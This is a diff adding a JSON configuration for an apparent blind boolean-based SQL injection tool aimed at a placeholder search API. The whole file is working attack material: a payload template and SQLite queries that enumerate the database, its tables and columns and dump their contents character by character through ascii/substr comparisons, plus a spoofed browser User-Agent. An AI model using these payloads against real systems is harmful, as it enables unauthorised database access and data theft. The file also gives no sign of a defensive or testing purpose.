@@ -1,0 +1,18 @@
+{
+    "target_url": "http://example.com/api/v1/search",
+    "method": "GET",
+    "target_param": "id",
+    "injection_type": "boolean",
+    "time_threshold": 3.0,
+    "success_keyword": "Success",
+    "payload_template": "1 AND ({query})",
+    "queries": {
+      "get_db": "ascii(substr('main', {pos}, 1)) = {ascii_val}",
+      "get_tables": "ascii(substr((SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {offset}), {pos}, 1)) = {ascii_val}",
+      "get_columns": "ascii(substr((SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}), {pos}, 1)) = {ascii_val}",
+      "dump_data": "ascii(substr((SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}), {pos}, 1)) = {ascii_val}"
+    },
+    "headers": {
+      "User-Agent": "Mozilla/5.0"
+    }
+  }
